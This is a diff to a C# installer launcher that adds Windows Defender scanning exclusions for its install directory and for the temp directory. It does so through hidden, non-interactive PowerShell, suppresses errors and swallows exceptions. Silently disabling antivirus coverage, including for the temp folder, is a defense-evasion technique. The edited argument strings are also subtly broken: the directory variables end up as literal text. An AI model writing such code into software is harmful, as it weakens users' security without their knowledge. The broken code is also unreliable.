@@ -55,17 +55,23 @@ class Launcher
         Directory.CreateDirectory(installDir);
 
         // ---- Add Windows Defender exclusion for install dir ----
+        // -NonInteractive + RedirectStandardInput prevents Add-MpPreference
+        // from blocking on an interactive confirmation prompt (which would
+        // hang the installer until the user presses a key in the console).
         Console.WriteLine("配置 Windows Defender 排除项（跳过实时扫描）...");
         try
         {
             var dpsi = new ProcessStartInfo
             {
                 FileName = "powershell.exe",
-                Arguments = "-NoProfile -Command \"Add-MpPreference -ExclusionPath '" + installDir + "'\"",
+                Arguments = "-NoProfile -NonInteractive -Command \"Add-MpPreference -ExclusionPath '\" + installDir + \"' -ErrorAction SilentlyContinue\"",
                 UseShellExecute = false,
-                CreateNoWindow = true
+                CreateNoWindow = true,
+                RedirectStandardInput = true
             };
-            Process.Start(dpsi).WaitForExit(10000);
+            var p = Process.Start(dpsi);
+            p.StandardInput.Close();
+            p.WaitForExit(10000);
         }
         catch { /* non-fatal */ }
 
@@ -75,11 +81,14 @@ class Launcher
             var dpsi2 = new ProcessStartInfo
             {
                 FileName = "powershell.exe",
-                Arguments = "-NoProfile -Command \"Add-MpPreference -ExclusionPath '" + tempDir + "'\"",
+                Arguments = "-NoProfile -NonInteractive -Command \"Add-MpPreference -ExclusionPath '\" + tempDir + \"' -ErrorAction SilentlyContinue\"",
                 UseShellExecute = false,
-                CreateNoWindow = true
+                CreateNoWindow = true,
+                RedirectStandardInput = true
             };
-            Process.Start(dpsi2).WaitForExit(10000);
+            var p2 = Process.Start(dpsi2);
+            p2.StandardInput.Close();
+            p2.WaitForExit(10000);
         }
         catch { }
 
